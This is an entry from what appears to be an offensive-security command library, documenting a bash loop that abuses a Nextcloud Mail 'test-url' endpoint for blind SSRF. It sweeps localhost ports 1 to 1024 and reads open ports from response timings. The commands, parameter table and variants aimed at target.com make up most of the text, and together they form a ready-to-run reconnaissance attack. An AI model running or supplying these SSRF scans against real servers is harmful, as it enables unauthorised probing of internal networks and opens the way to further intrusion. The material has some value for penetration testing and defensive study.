---
data: >-
  for port in {1..1024}; do time curl -b cookies.txt -X POST
  'https://nextcloud.example.com/apps/mail/api/v1/test-url' -d
  "url=http://127.0.0.1:$port"; done
tags:
  - ssrf
  - port-scan
  - blind
  - nc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-01-10T00:00:00Z'
updated_at: '2025-12-14T03:53:38.637Z'
id: 61145109-be5e-4318-8ef5-352ab9fe9b3b
verified: false
validated: true
submitted: true
---
# nc-port-scan

## Command

```bash
for port in {1..1024}; do time curl -b cookies.txt -X POST 'https://nextcloud.example.com/apps/mail/api/v1/test-url' -d "url=http://127.0.0.1:$port"; done
```

## Description

This bash loop uses curl to send multiple SSRF-triggering requests to probe local ports via timing differences in responses, useful for blind SSRF verification in environments like Nextcloud where direct output is unavailable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for port in {1..1024}` | Loop over port range | Yes |
| `time curl ...` | Measure execution time for each request | Yes |
| `-b cookies.txt` | Authentication cookies | Yes |
| `-d "url=http://127.0.0.1:$port"` | Malicious URL with port variable | Yes |

## Examples

### Basic Usage

```bash
for port in {80,443,22}; do time curl -X POST 'https://target.com/test' -d "url=http://localhost:$port"; done
```

### Advanced Usage

```bash
for port in {1..100}; do (time curl -s -o /dev/null -X POST 'https://target.com/test' -d "url=http://internal:$port") 2>&1 | grep real; done
```

## Expected Output

Timing outputs like "real 0m0.123s" for each port; longer times indicate open ports or successful SSRF hits.

## Related

- [[Related Procedure: Trigger-Blind-SSRF-in-Nextcloud-Mail-App]]
